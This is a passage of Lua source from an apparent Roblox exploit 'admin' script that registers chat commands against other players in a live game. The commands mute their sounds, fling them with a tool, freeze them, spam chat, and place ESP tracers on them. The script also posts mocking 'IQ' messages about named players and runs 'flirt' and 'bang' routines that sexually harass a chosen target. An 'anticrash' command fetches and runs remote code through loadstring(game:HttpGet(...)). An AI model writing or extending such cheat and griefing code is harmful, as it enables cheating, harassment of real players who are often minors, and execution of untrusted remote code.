			if v:IsA('Sound') and v.Playing and (not v:IsDescendantOf(plr.Character) or not v:IsDescendantOf(plr.Backpack)) then
				v.TimePosition = 0
				v.Playing = false
			end
		end
		return Notify('Muted all sounds')
	end
	
	if GetPlayer(Args[1]) or Notify(format('Could not fin Player %s', Args[1])) then
		local Player = GetPlayer(Args[1])

		Notify(format('Muted %s', Player.DisplayName), pfp(Player.UserId))
		for _, v in next, Player.Character:GetDescendants() do
			if v:IsA('Sound') and v.Playing then
				v.TimePosition = 0
				v.Playing = false
			end
		end

		for _, v in next, Player.Backpack:GetDescendants() do
			if v:IsA('Sound') and v.Playing then
				v.TimePosition = 0
				v.Playing = false
			end
		end
	end
end)

AddCommand('superloopmute', {'supermute'}, 'OP Mute', function()
	SoundService.RespectFilteringEnabled = false
	Disconnect(GSignals['SUPERMUTE'])
	GSignals['SUPERMUTE'] = Heartbeat:Connect(function()
		for _, __ in next, {game} do
			for __, ___ in next, __:GetDescendants() do
				if ___:IsA('Sound') then
					if ___.Parent.Name == 'Handle' then
						if not find(Whitelist, ___.Parent.Parent.Parent.Name) then
							___.Playing = false
						end
					end
				end
			end
		end
	end)
end)

AddCommand('unsuperloopmute', {'unsupermute'}, 'unOP mute', function()
	Disconnect(GSignals['SUPERMUTE'])
end)

AddCommand('boomboxmute', {'bmute'}, 'Mutes BoomBox', function(Args)
	if not Args[1] or (Args[1] == 'all' or Args[1] == 'others') then
		Notify('Muted BoomBoxes!')
		for _, v in next, workspace:GetDescendants() do
			if v:IsA('Sound') and v.Playing and not v:IsDescendantOf(plr.Character) then
				v.TimePosition = 0
				v.Playing = false
			end
		end
	elseif GetPlayer(Args[1]) then
		Notify('Muted '..GetPlayer(Args[1]).DisplayName, 3, pfp(GetPlayer(Args[1]).UserId))
		for _, v in next, workspace:GetDescendants() do
			if v:IsA('Sound') and v.Playing and not v:IsDescendantOf(GetPlayer(Args[1]).Character) then
				v.TimePosition = 0
				v.Playing = false
			end
		end
	elseif not GetPlayer(Args[1]) then
		Notify('Could not find Player ' .. Args[1])
	end
end)

AddCommand('loopmute', {'automute'}, 'Constant Mute', function()
	SoundService.RespectFilteringEnabled = false
	if _G.IvAdminMute then
	    _G.IvAdminMute:Disconnect()
	end

	for _, v in next, workspace:GetDescendants() do
		if v:IsA('Sound') and v.Playing then
			v.TimePosition = 0
			v.Playing = false
		end
	end
		
	_G.IvAdminMute = nil
	Notify('Loopmute enabled!')
	_G.IvAdminMute = workspace.DescendantAdded:Connect(function(Sound)
	    if Sound:IsA('Sound') then
	        RenderStepped:Wait()
	        if Sound.Playing and not Sound:IsDescendantOf(plr.Character) then
	            Sound.TimePosition = 0
	            Sound.Playing = false
	        end
	    end
	end)
end)

AddCommand('unloopmute', {'unautomute'}, 'Unmute', function()
	Disconnect(_G.IvAdminMute)
end)

AddCommand('play', {'bplay'}, 'BoomBox Play', function(int)
	local IfPlayer = GetPlayer(int[1])

	if IfPlayer and type(IfPlayer) ~= 'table' then
		if IfPlayer.Character and IfPlayer.Character:FindFirstChildOfClass('Tool') then
			if IfPlayer.Character.Tool.Handle.Sound.Playing then
				local Tool = (plr.Character:FindFirstChildOfClass('Tool') or plr.Backpack:FindFirstChildOfClass('Tool'))
		
				if Tool then
					Tool.Parent = plr.Character
					Tool.Remote:FireServer('PlaySong', IfPlayer.Character.Tool.Handle.Sound.SoundId)
				end
			end
		end
	else
		if not toNum(int[1]) then
			return Notify('Invalid AudioID: '..int[1])
		end

		local Tool = (plr.Character:FindFirstChildOfClass('Tool') or plr.Backpack:FindFirstChildOfClass('Tool'))

		if Tool then
			Tool.Parent = plr.Character
			Tool.Remote:FireServer('PlaySong', int[1])
		end
	end
end)

AddCommand('mplay', {'multiplay', 'massplay'}, 'Lay down the beat on all boomboxes', function(Args)
	if toNum(Args[1]) or Notify(format('Invalid AssetID, %s', toStr(Args[1]))) then
		for _, v in next, plr.Backpack:GetChildren() do
			if match(lower(v.Name), 'boombox') and v:FindFirstChild('Remote') then
				v.Parent = plr.Character
				v.Remote:FireServer('PlaySong', Args[1])
			end
		end

		for _, v in next, plr.Character:GetChildren() do
			if v:IsA('Tool') and match(lower(v.Name), 'boombox') and v:FindFirstChild('Remote') then
				v.Remote:FireServer('PlaySong', Args[1])
			end
		end
	end
end)

AddCommand('toolfling', {'tfling'}, 'Tool Fling (Modes)', function(Args)
	Method = Args[1]

	if Method:lower() == 'methods' then
	    return Notify('Methods: {mouse, players, radius, protector/hrp}')
	end
			
	_G.ToolFlingSettings = {
	    Mouse = false,
		Radius = false,
	    Players = false,
	    Protector = false
	}
	
	if Method:lower() == 'mouse' then
	    _G.ToolFlingSettings.Mouse = true
		_G.ToolFlingSettings.Radius = false
	    _G.ToolFlingSettings.Players = false
	    _G.ToolFlingSettings.Protector = false
	elseif Method:lower() == 'players' then
	    _G.ToolFlingSettings.Mouse = false
		_G.ToolFlingSettings.Radius = false
	    _G.ToolFlingSettings.Players = true
	    _G.ToolFlingSettings.Protector = false
	elseif Method:lower() == 'protector' or Method:lower() == 'hrp' then
	    _G.ToolFlingSettings.Mouse = false
		_G.ToolFlingSettings.Radius = false
	    _G.ToolFlingSettings.Players = false
	    _G.ToolFlingSettings.Protector = true
	elseif lower(Method) == 'radius' then
		_G.ToolFlingSettings.Mouse = false
		_G.ToolFlingSettings.Radius = true
	    _G.ToolFlingSettings.Players = false
	    _G.ToolFlingSettings.Protector = false
	else
	    return Notify('Invalid Method: '..Method..'\n{mouse, players, radius, protector/hrp}')
	end

	Notify('Method: '..Method)
	plr.Character.Humanoid:UnequipTools(); RenderStepped:Wait()
	local Tool = plr.Backpack:FindFirstChildOfClass('Tool')
	local Right = (plr.Character:FindFirstChild('Right Arm') or plr.Character:FindFirstChild('RightHand'))

	if not Tool then
		return Notify('Tool required!')
	end

	plr.Character.HumanoidRootPart.Anchored = true
	Tool.Parent = plr.Character; wait(0.4)
	StopAnim('ToolNoneAnim')
	
	for _, v in next, Tool.Handle:GetChildren() do
	    if v:IsA('BodyPosition') or v:IsA('BodyGyro') then
	        v:Destroy()
	    end
	end

	local p = (plr.Character:FindFirstChild('HumanoidRootPart') or plr.Character:FindFirstChildWhichIsA('BasePart'))
	local BodyGyro = Instance.new('BodyGyro', Tool.Handle)
	local BodyPosition = Instance.new('BodyPosition', Tool.Handle)
	local inf, Run = Vector3.new(huge, huge, huge)
	local fp = (p and p.CFrame)
	local IsR = false
		
	BodyPosition.D = 250
	BodyPosition.MaxForce = inf
	BodyGyro.D = 250
	BodyGyro.MaxTorque = inf
	BodyPosition.Position = plr.Character.Head.Position
	
	if Right then
	    Right:Destroy()
	end

	wait(0.5)
	plr.Character.HumanoidRootPart.Anchored = false
	plr.Character:SetPrimaryPartCFrame(fp)
	Run = Heartbeat:Connect(function()
	    if plr.Character and plr.Character:FindFirstChild('Humanoid') and plr.Character.Humanoid.Health > 0 then
	        pcall(function()
	            if not (plr.Character:FindFirstChild('Right Arm') or plr.Character:FindFirstChild('RightHand')) then
					local HumanoidRootPart = plr.Character.HumanoidRootPart
	                if _G.ToolFlingSettings.Players then
	                    for _, v in next, GetPlayers() do
	                        if v and v.Character then
	                            pcall(function()
	                                BodyPosition.Position = v.Character.HumanoidRootPart.Position
	                            end)
	                        end
	                    end
	                end
	                
	                if _G.ToolFlingSettings.Mouse then
	                    BodyPosition.Position = Vector3.new(plr:GetMouse().Hit.Position.X, plr:GetMouse().Hit.Position.Y, plr:GetMouse().Hit.Position.Z)
	                end
	
	                if _G.ToolFlingSettings.Protector then
	                    BodyPosition.Position = HumanoidRootPart.Position
	                    BodyGyro.CFrame = CFrame.lookAt(Tool.Handle.Position, HumanoidRootPart.Position)
	                end

					if _G.ToolFlingSettings.Radius then
						if not IsR then
							IsR = true
							spawn(function()
								pcall(function()
									BodyPosition.Position = plr.Character.HumanoidRootPart.Position - Vector3.new(0, 5, 0)
									for _, v in next, filter(GetPlayers(), plr) do
										pcall(function()
											if (v.Character.HumanoidRootPart.Position - plr.Character.HumanoidRootPart.Position).Magnitude < 10 then
												for i = 1, 3 do
													BodyPosition.Position = v.Character.HumanoidRootPart.Position
													RenderStepped:Wait()
												end

												BodyPosition.Position = plr.Character.HumanoidRootPart.Position - VEctor3.new(0, 5, 0)
											end
										end)
									end
								end)

								IsR = false
							end)
						end
	                end
	
	                Tool.Handle.CanCollide = false
	                Tool.Handle.Velocity = Vector3.new(24, 30, 4)
	                Tool.Handle.RotVelocity = Vector3.new(9e9, -9e9, 9e9)
	            else
					Notify('Tool Fling, Deactivated!')
	                Run:Disconnect()
	            end
	        end)
	    else
			Notify('Tool Fling, Deactivated!')
	        Run:Disconnect()
	    end
	end)
end)

AddCommand('iq', {'getiq'}, 'Intelligence?', function(Args)
	if Args[1] == 'all' or Args[1] == 'others' then
		for _, v in next, plrs:GetPlayers() do
			if v ~= plr then
				local IQ = random(1, 150)
				local Message = plr.DisplayName..'\'s IQ is Intelligence'; wait(1/10)
				ChatRemote:FireServer(Message:gsub('Intelligence', IQ), 'All')
			end
		end
	elseif GetPlayer(Args[1]) then
		local IQ = random(1, 150)
		local Message = GetPlayer(Args[1]).DisplayName..'\'s IQ is Intelligence'; wait(1/10)
		ChatRemote:FireServer(Message:gsub('Intelligence', IQ), 'All')
	else
		Notify(format('Could not find player \'%s\'', Args[1]))
	end
end)

AddCommand('tptool', {'tooltp'}, 'Tool to Teleport', function()
	if plr.Backpack:FindFirstChild('ClickTp') or plr.Character:FindFirstChild('ClickTp') then
		if plr.Backpack:FindFirstChild('ClickTp') then
			plr.Backpack.ClickTp.Parent = plr.Character
		end
		return Notify('Click 2 Teleport')
	end

	local Tool = Instance.new('Tool', plr.Backpack)
	local rbx, rbx2

	Tool.ToolTip = 'Click 2 Tp'
	Tool.CanBeDropped = false
	Tool.RequiresHandle = false
	Tool.Name = 'ClickTp'
	rbx = Tool.Activated:Connect(function()
		if plr:GetMouse().Target:IsA('BasePart') then
			plr.Character:SetPrimaryPartCFrame(plr:GetMouse().Hit * CFrame.new(0, 2, 0))
		end
	end)

	rbx2 = plr.CharacterAdded:Connect(function()
		rbx:Disconnect()
		rbx2:Disconnect()
	end)
	Notify('Click 2 Teleport')
end)

AddCommand('ctrltp', {}, 'Teleport via Ctrl + Click', function()
	Disconnect(GSignals['CtrlClick'], GSignals)
	GSignals['CtrlClick'] = plr:GetMouse().Button1Down:Connect(function()
		if InputService:IsKeyDown(Enum.KeyCode.LeftControl) then
			pcall(function()
				plr.Character:SetPrimaryPartCFrame(plr:GetMouse().Hit)
			end)
		end
	end)
end)

AddCommand('noctrltp', {}, 'Disabled Ctrl + Click TP', function()
	Disconnect(GSignals['CtrlClick'], GSignals)
end)

AddCommand('spam', {'autochat'}, 'Spam a Message', function(Args)
	if _G.IvAdminChatSpam and _G.IvAdminChatSpam.Spam then
		_G.IvAdminChatSpam.Spam = false
	end

	if not Args[1] then
		Notify('Text must not be blank')
	end

	_G.IvAdminChatSpam = {
		Spam = true,
		Speed = 1/3
	}
	local Output = ''

	for _, v in next, Args do
		Output = Output..v..' '
	end

	RenderStepped:Wait()
	while _G.IvAdminChatSpam.Spam and wait(_G.IvAdminChatSpam.Speed) do
		ChatRemote:FireServer(Output, 'All')
	end
end)

AddCommand('spamspeed', {'chatspeed'}, 'Speed Spam', function(Args)
	if Args[1] then
		if _G.IvAdminChatSpam then
			_G.IvAdminChatSpam.Speed = toNum(Args[1]) or 1/5
		end
	end
end)

AddCommand('unspam', {'unautochat'}, 'Stop spam', function(Args)
	if _G.IvAdminChatSpam and _G.IvAdminChatSpam.Spam then
		_G.IvAdminChatSpam.Spam = false
	end
end)

AddCommand('freeze', {}, 'Freeze!', function(Args)
	local Freeze = function(Player)
		local Ice = Instance.new('Part', Player)
		Ice.Name = 'Ice'
		Ice.Anchored = true
		Ice.CanCollide = true
		Ice.BrickColor = BrickColor.new('Cyan')
		Ice.Material = Enum.Material.ForceField
		Ice.CFrame = Player.Humanoid.Torso.CFrame
		Ice.Size = Vector3.new(4, Player.Humanoid.Torso.Size.Y * 4, 4)
	end

	if Args[1] == 'all' or Args[1] == 'others' then
		for _, v in next, plrs:GetPlayers() do
			if v ~= plr then
				if v.Character then
					v.Character.Humanoid.Torso.Anchored = true
					Freeze(v.Character)
				end
			end
		end
	elseif GetPlayer(Args[1]) then
		local Target = GetPlayer(Args[1])

		Target.Character.Humanoid.Torso.Anchored = true
		Freeze(Target.Character)
	else
		Notify('Could not find Player '.. Args[1])
	end
end)

AddCommand('unfreeze', {'thaw'}, 'Unfreeze!', function(Args)
	if Args[1] == 'all' or Args[1] == 'others' then
		for _, v in next, plrs:GetPlayers() do
			pcall(function()
				v.Character.Humanoid.Torso.Anchored = false
				v.Character.Ice:Destroy()
			end)
		end
	elseif GetPlayer(Args[1]) then
		if GetPlayer(Args[1]).Character:FindFirstChild('Ice') then
			GetPlayer(Args[1]).Character.Humanoid.Torso.Anchored = false
			GetPlayer(Args[1]).Character:FindFirstChild('Ice'):Destroy()
		end
	else
		Notify(format('Could not find player \'%s\'', Args[1]))
	end
end)

AddCommand('demesh', {'rmesh'}, 'Remove meshes', function(Args)
	for _, v in next, plr.Character:GetDescendants() do
		if v:IsA('SpecialMesh') then
			v:Destroy()
		end
	end
end)

AddCommand('dtmesh', {'rtmesh'}, 'Remove tool mesh', function(Args)
	local Tool = plr.Character:FindFirstChildOfClass('Tool')
	
	if Tool then
		Tool:FindFirstChildOfClass('Part'):FindFirstChild('SpecialMesh'):Destroy()
	else
		Notify('Could not find Tool!')
	end
end)

AddCommand('audiolag', {'alag'}, 'Lag Audios', function()
	_G.IvAdminLagAudios = true

	repeat
		Stepped:Wait()
		for _, v in next, workspace:GetDescendants() do
			if v:IsA('Sound') and v.Playing then
				v.TimePosition = random(1, 100)
			end
		end
	until not _G.IvAdminLagAudios
end)

AddCommand('unaudiolag', {'unalag'}, 'unLag Audios', function()
	_G.IvAdminLagAudios = false
end)

AddCommand('trace', {}, 'Find your target', function(Args)
	_G.IvAdminTracers = _G.IvAdminTracers or {}

	if Args[1] == 'all' or Args[1] == 'others' then
		for _, v in next, _G.IvAdminTracers do
			for _, vi in next, v do
				if vi.ClassName then
					vi:Destroy()
				end
			end

			remove(_G.IvAdminTracers, _)
		end

		for _, v in next, plrs:GetPlayers() do
			if v ~= plr then
				pcall(function()
					local Insts = {
						Player = v.Name,
						Filled = Instance.new('Frame'),
						Beam = Instance.new('Beam', v.Character.HumanoidRootPart),
						Weld = Instance.new('Weld', v.Character.HumanoidRootPart),
						Box = Instance.new('BillboardGui', v.Character.HumanoidRootPart),
						Attachment0 = Instance.new('Attachment', v.Character.HumanoidRootPart),
						Attachment1 = Instance.new('Attachment', plr.Character.HumanoidRootPart),
					}
					
					Insts.Beam.Name = 'Tracer'
					Insts.Beam.Attachment0 = Insts.Attachment0
					Insts.Beam.Attachment1 = Insts.Attachment1
					Insts.Beam.Color = ColorSequence.new(Color3.new(0, 1, 0))
					Insts.Beam.Width0 = 0.1
					Insts.Beam.Width1 = 0.1
					Insts.Beam.Segments = 100
					Insts.Beam.FaceCamera = true
					Insts.Beam.LightInfluence = 1
					Insts.Beam.Transparency = NumberSequence.new(0, 0)
					Insts.Weld.Part1 = plr.Character.HumanoidRootPart
					Insts.Weld.C0 = CFrame.new(-256, 10, 256, -1, 0, 0, 0, 0, 1, 0, 1, -0)
					Insts.Weld.C1 = CFrame.new(-243.262, -265.122, -0.125, -1, 0, 0, 0, -1, 0, 0, 0, 1)
					Insts.Box.Name = 'Box'
					Insts.Box.Active = true
					Insts.Box.AlwaysOnTop = true
					Insts.Box.LightInfluence = 1
					Insts.Box.Size = UDim2.new(4, 0, 5.5, 0)
					Insts.Filled.Parent = Insts.Box
					Insts.Filled.Size = UDim2.new(1, 0, 1, 0)
					Insts.Filled.BackgroundTransparency = 0.8
					Insts.Filled.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
					insert(_G.IvAdminTracers, Insts)
				end)
			end
		end
	elseif GetPlayer(Args[1]) then
		local Target = GetPlayer(Args[1])

		for _, v in next, _G.IvAdminTracers do
			if v.Player == Target.Name then
				for _, vi in next, v do
					if vi.ClassName then
						v:Destroy()
					end
				end

				remove(_G.IvAdminTracers, _)
			end
		end

		local Insts = {
			Player = Target.Name,
			Filled = Instance.new('Frame'),
			Beam = Instance.new('Beam', Target.Character.HumanoidRootPart),
			Weld = Instance.new('Weld', Target.Character.HumanoidRootPart),
			Box = Instance.new('BillboardGui', Target.Character.HumanoidRootPart),
			Attachment0 = Instance.new('Attachment', Target.Character.HumanoidRootPart),
			Attachment1 = Instance.new('Attachment', plr.Character.HumanoidRootPart),
		}
		
		Insts.Beam.Name = 'Tracer'
		Insts.Beam.Attachment0 = Insts.Attachment0
		Insts.Beam.Attachment1 = Insts.Attachment1
		Insts.Beam.Color = ColorSequence.new(Color3.new(0, 1, 0))
		Insts.Beam.Width0 = 0.1
		Insts.Beam.Width1 = 0.1
		Insts.Beam.Segments = 100
		Insts.Beam.FaceCamera = true
		Insts.Beam.LightInfluence = 1
		Insts.Beam.Transparency = NumberSequence.new(0, 0)
		Insts.Weld.Part1 = plr.Character.HumanoidRootPart
		Insts.Weld.C0 = CFrame.new(-256, 10, 256, -1, 0, 0, 0, 0, 1, 0, 1, -0)
		Insts.Weld.C1 = CFrame.new(-243.262, -265.122, -0.125, -1, 0, 0, 0, -1, 0, 0, 0, 1)
		Insts.Box.Name = 'Box'
		Insts.Box.Active = true
		Insts.Box.AlwaysOnTop = true
		Insts.Box.LightInfluence = 1
		Insts.Box.Size = UDim2.new(4, 0, 5.5, 0)
		Insts.Filled.Parent = Insts.Box
		Insts.Filled.Size = UDim2.new(1, 0, 1, 0)
		Insts.Filled.BackgroundTransparency = 0.8
		Insts.Filled.BackgroundColor3 = Color3.fromRGB(0, 255, 0)

		insert(_G.IvAdminTracers, Insts)
		Notify('Tracing ' .. Target.DisplayName, 3, pfp(Target.UserId))
	else
		Notify('Could not find Player ' .. Args[1])
	end
end)

AddCommand('untrace', {}, 'removes tracers', function(Args)
	if not _G.IvAdminTracers then
		return Notify('No Tracers Enabled')
	end

	if Args[1] == 'all' or Args[1] == 'others' then
		for _, v in next, _G.IvAdminTracers do
			for _, vi in next, v do
				if vi.ClassName then
					vi:Destroy()
				end
			end
		end

		clear(_G.IvAdminTracers)
		Notify('Removed Tracers')
	elseif GetPlayer(Args[1]) then
		local Target = GetPlayer(Args[1])

		for _, v in next, _G.IvAdminTracers do
			if v.Player == Target.Name then
				for _, vi in next, v do
					if vi.ClassName then
						vi:Destroy()
					end
				end

				remove(_G.IvAdminTracers, _)
			end
		end
		Notify('Removed Tracer from ' .. Target.DisplayName, 3, pfp(Target.UserId))
	else
		Notify('Could not find Player ' .. Args[1])
	end
end)

AddCommand('anticrash', {'aac'}, 'Prevents crashing', function()
	if _G.IvAdminAntiCrash then
		return Notify('Anti-Crash already Enabled!')
	end

	Notify('Anti-Crash Enabled!')
	loadstring(game:HttpGet(''))()
end)

AddCommand('infjump', {'infinitejump'}, 'Infinite Jump', function()
	Notify('Infinite Jump: Enabled')
	GSignals['InfiniteJump'] = plr:GetMouse().KeyDown:Connect(function(key)
		if key == ' ' then
			pcall(function()
				plr.Character.Humanoid:ChangeState(3)
			end)
		end
	end)
end)

AddCommand('uninfjump', {'uninfinitejump'}, 'Uninfinite Jump', function()
	Notify('Infinite Jump: Disabled')
	Disconnect(GSignals['InfiniteJump'])
end)

AddCommand('poop', {'turd'}, 'What is that!', function(Args)
	if Args[1] ~= 'all' and GetPlayer(Args[1]) then
		local Audio = 5512747993
		local Tool = (plr.Backpack:FindFirstChildOfClass('Tool') or plr.Character:FindFirstChildOfClass('Tool'))
		local Render = RenderStepped

		plr.Character.Humanoid.Sit = false
		plr.Character.HumanoidRootPart.Anchored = false
		plr.Character.Humanoid.Sit = true; Render:Wait()
		plr.Character.HumanoidRootPart.Anchored = true
		
		Tool.Parent = plr.Character
		wait(0.2)
		
		Tool.Remote:FireServer('PlaySong', Audio)
		plr.Character:SetPrimaryPartCFrame(GetPlayer(Args[1]).Character.Head.CFrame * CFrame.new(0, 1, 0))
		plr.Character.HumanoidRootPart.Anchored = false; Render:Wait()
		plr.Character.HumanoidRootPart.Anchored = true; wait(3)
		plr.Character.HumanoidRootPart.Anchored = false
		Tool.Parent = plr.Backpack
	else
		Notify('Could not find Player ' .. Args[1])
	end
end)

AddCommand('antidisplay', {'nodisplay'}, 'Removes Display Names', function()
	if not _G.NoDisplay or Notify('Anti-DisplayName: Already Enabled!') then
		Notify('Anti-DisplayName: Enabled\nThis Action cannot be undone!')
		_G.NoDisplay = true
		_G.NoDisplays = {}

		for _, v in next, GetPlayers() do
			_G.NoDisplays[v.UserId] = {v.DisplayName, v.Name}
			v.DisplayName = v.Name
			if v.Character and v.Character:FindFirstChild('Humanoid') then
				v.Character.Humanoid.DisplayName = v.Name
			end
	
			v.CharacterAdded:Connect(function(Chr)
				v.DisplayName = v.Name
				Chr:WaitForChild('Humanoid').DisplayName = v.Name
			end)
		end
		
		plrs.PlayerAdded:Connect(function(v)
			v.CharacterAdded:Connect(function(Chr)
				_G.NoDisplays[v.UserId] = {v.DisplayName, v.Name}
				Chr:WaitForChild('Humanoid').DisplayName = v.Name
			end)
		end)

		plrs.PlayerRemoving:Connect(function(v)
			if _G.NoDisplays[v.UserId] then
				for _, v in next, _G.NoDisplays do
					if v[2] == v.Name then
						remove(_G.NoDisplays, _)
					end
				end
			end
		end)

		
		local ChatFrame = game:GetService('Players').vh7z.PlayerGui.Chat.Frame.ChatChannelParentFrame.Frame_MessageLogDisplay.Scroller

		if _G.NoDisplay then
			local Changed = {}
			
			for _, v in next, ChatFrame:GetDescendants() do
				if v:IsA('TextButton') then
					for _, v2 in next, _G.NoDisplays do
						if string.match(v.Text, '%w+')  == v2[1] then
							v.Parent.Text =  ('  '):rep(v2[2]:len() + 4) .. v.Parent.Text:gsub(v.Parent.Text:sub(0, v2[1]:len() + 3), '')
							v.Text = v.Text:gsub('%w+', v2[2])
						end
					end
				end
			end

			ChatFrame.ChildAdded:Connect(function(Frame)
				task.wait(0.5)
				local Frame = Frame.TextLabel.TextButton

				for _, v in next, _G.NoDisplays do
					if string.match(Frame.Text, '%w+') == v[1] then
						Frame.Parent.Text = ('  '):rep(v[2]:len() + 4) .. Frame.Parent.Text:gsub(Frame.Parent.Text:sub(0, v[1]:len() + 3), '')
						Frame.Text = Frame.Text:gsub('%w+', v[2])
					end
				end
			end)
		end
	end
end)

AddCommand('flirt', {}, 'UH@#()@R#N# ANKJN Crush', function(Args)
	_G.Flirting = false
	wait(0.3)
	_G.Flirting = true

	local Quotes = {
		Greeting = {
			'Hello, Sunshine!',
		},
		
		Flirting = {
			'I wish I was your mirror, so that I could look at you every morning.',
			'When I need a pick me up, I just think of your laugh and it makes me smile.',
			'If I had a candy bar for every time I thought of you, I would be fat.',
			'I wish I was your teddy bear.',
			'It\'s said that nothing lasts forever. Will you be my nothing?',
			'It\'s not my fault that I fell for you, you tripped me!',
			'I\'m trying my best to fall asleep, but I just can\'t stop thinking about you.',
			'Rawr means, Hey there, in dinosaur. Rawr!',
		},
	
		Farewells = {
			'Sweet dreams… I hope I\'m in them.',
		}
	}
	
	if Args[1] == 'all' or Args[1] == 'others' then
		return Notify('Action not supported.')
	elseif not GetPlayer(Args[1]) then
		return Notify('Could not find Player '.. Args[1])
	end

	local Target = GetPlayer(Args[1])
	Notify('Flirting with .. ' .. Target.DisplayName, 3, pfp(Target.UserId))
	plr.Character:SetPrimaryPartCFrame(Target.Character.Humanoid.Torso.CFrame * CFrame.new(4, 0, 0))
	ChatRemote:FireServer(Quotes.Greeting[random(1, #Quotes.Greeting)], 'All'); ResV(plr.Character)

	while _G.Flirting or plr.Character.Humanoid.Health > 0 and Stepped:Wait() do
		if not _G.Flirting or plr.Character.Humanoid.Health <= 0 then
			return ChatRemote:FireServer(Quotes.Farewells[random(1, #Quotes.Farewells)], 'All')
		end
		for i = 1, 200 do
			if not _G.Flirting then
				print(_G.Flirting, 3)
				ChatRemote:FireServer(Quotes.Farewells[random(1, #Quotes.Farewells)], 'All')
				break
			end

			pcall(function()
				plr.Character.Humanoid:MoveTo((Target.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, rad(-180), 0) * CFrame.new(0, 0, 4)).Position)
			end)
			Stepped:Wait()
		end
		ChatRemote:FireServer(Quotes.Flirting[random(1, #Quotes.Flirting)], 'All')
	end
end)

AddCommand('unflirt', {}, 'Time to go', function()
	_G.Flirting = false
	Notify('Damn. :(', 1.5, pfp(plr.UserId))
end)

AddCommand('ignore', {'ban', 'hide'}, 'Get him out of here', function(Args)
	if Args[1] == 'all' or Args[1] == 'others' or Args[1] == 'me' then
		return Notify('Action not supported!')
	elseif not GetPlayer(Args[1]) then
		return NOtify(format('Could not find Player %s', Args[1]))
	end

	local Target = GetPlayer(Args[1])
	local isIgnored = isIndexOf(PlayersData.Ignored, Target.Name)

	if not isIgnored or Notify(format('%s is already being ignored!', Target.DisplayName), pfp(Target.UserId), 5) then
		insert(PlayersData.Ignored, Target.Name)
		Notify(format('%s has been ignored!', Target.Name), pfp(Target.UserId), 5)

		MuteRemote:InvokeServer(Target.Name)
		if Target.Character then
			Target.Character:Destroy()
		end
		
		Target.CharacterAdded:Connect(function(v)
			RenderStepped:Wait()
			v:Destroy()
		end)
	end
end)

AddCommand('orbit', {}, 'Become Planet', function(Args)
	if _G.IvAdminOrbit then
		_G.IvAdminOrbit.Orbit = false
		_G.IvAdminOrbit.Target = 'nil'
	end

	if Args[1] == 'all' or Args[1] == 'others' then
		return Notify('Action not supported.')
	elseif not GetPlayer(Args[1]) then
		return Notify('Could not find Player '.. Args[1])
	end

	_G.IvAdminOrbit = {}
	_G.IvAdminOrbit.Orbit = true
	_G.IvAdminOrbit.Speed = toNum(Args[2]) or 5
	_G.IvAdminOrbit.Target = GetPlayer(Args[1])

	Notify('Orbiting '.._G.IvAdminOrbit.Target.Name)
	while _G.IvAdminOrbit.Orbit do
		if not plrs:FindFirstChild(_G.IvAdminOrbit.Target.Name) then
			_G.IvAdminOrbit.Orbit = false
			return
		end

		for i = 1, 360, _G.IvAdminOrbit.Speed do
			pcall(function()
				if not plrs:FindFirstChild(_G.IvAdminOrbit.Target.Name) then
					_G.IvAdminOrbit.Orbit = false
					return
				end
				plr.Character:SetPrimaryPartCFrame(_G.IvAdminOrbit.Target.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, rad(i), 0) * CFrame.new(5, 0, 0))
			end)
			task.wait()
		end
	end
end)

AddCommand('unorbit', {}, 'Stop orbiting', function()
	if _G.IvAdminOrbit then
		_G.IvAdminOrbit.Orbit = false
		_G.IvAdminOrbit.Target = 'nil'
	end
end)

AddCommand('headbang', {}, 'Head bang someone', function(Args)
    if Args[1] == 'me' or Args[1] == 'all' or Args[1] == 'others' then
        Notify('Action not supported.')
    end

    local Target = GetPlayer(Args[1])

    if Target then
        pcall(fuy)
    end
end)

AddCommand('bang', {}, 'naughty naughty', function(Args)
	if Args[1] == 'all' or Args[1] == 'others' then
		return Notify('Action not supported.')
	elseif not GetPlayer(Args[1]) then
		return Notify('Could not find Player '.. Args[1])
	end

	local Target = GetPlayer(Args[1])
	local Anim = Instance.new('Animation')
	Anim.AnimationId = 'rbxassetid://148840371'
	plr.Character.Humanoid:LoadAnimation(Anim):Play()

	_G.IvAdminBang = false; wait(0.2)
	_G.IvAdminBang = true

	while _G.IvAdminBang and wait() do
		if not plrs:FindFirstChild(Target.Name) then
			print('bad')
			_G.IvAdminBang = false
			return Anim:LoadAnimation(Anim):Stop()
		end

		if Target.Character and Target.Character:FindFirstChild('HumanoidRootPart') then
			pcall(function()
				workspace.CurrentCamera.CameraSubject = Target.Character.Humanoid
				for i = 1, 3, 0.5 do
					plr.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, i); wait()
				end

				for i = 1, 3, 0.5 do
					plr.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, (3- i)); wait()
				end
			end)
		end
	end
end)

AddCommand('unbang', {}, 'not naughty naughty', function()
	_G.IvAdminBang = false
	
	workspace.CurrentCamera.CameraSubject = plr.Character.Humanoid
	for _, v in next, plr.Character.Humanoid:GetPlayingAnimationTracks() do
		v:Stop()
	end
end)

AddCommand('clock', {}, 'What time is it?', function()
	Notify('Time: '.. toStr(os.date('%X', os.time())))
end)

AddCommand('copytime', {'copyclock'}, 'Copy The Time', function()
	if not setclipboard then
		return Notify('Exploit Does Not Support This Function!')
	end

	Notify('Copied Time to Clipboard ' .. toStr(os.date('%X', os.time())))
	setclipboard(toStr(os.date('%X', os.time())))
end)

AddCommand('crtools', {'copyrtools'}, 'Copies tools in RepStorage', function()
	local Tools = {}

	for _, v in next, game:GetService('ReplicatedStorage'):GetDescendants() do
		if v:IsA('Tool') then
			insert(Tools, v)
		end
	end

	if #Tools == 0 then
		return Notify('No Tools found in RepStorage')
	end

	Notify('Found ' .. #Tools .. ' Tools in RepStorage')
	for _, v in next, Tools do
		v:Clone().Parent = plr.Backpack
	end
end)

AddCommand('copyname', {'cname'}, 'Copy Player UserName', function(Args)
	if not setclipboard then
		return Notify('Exploit Does Not Support This Function!')
	end

	for _, v in next, plrs:GetPlayers() do
		if Args[1] == 'all' then
			setclipboard(v.Name)
			Notify('Copied to clipboard '..v.Name, 3, pfp(v.UserId))
		elseif v == GetPlayer(Args[1]) then
			setclipboard(v.Name)
			Notify('Copied to clipboard '..v.Name, 3, pfp(v.UserId))
		end
	end
end)

AddCommand('copydisplay', {'cdisplay'}, 'Copy Player DisplayName', function(Args)
	if not setclipboard then
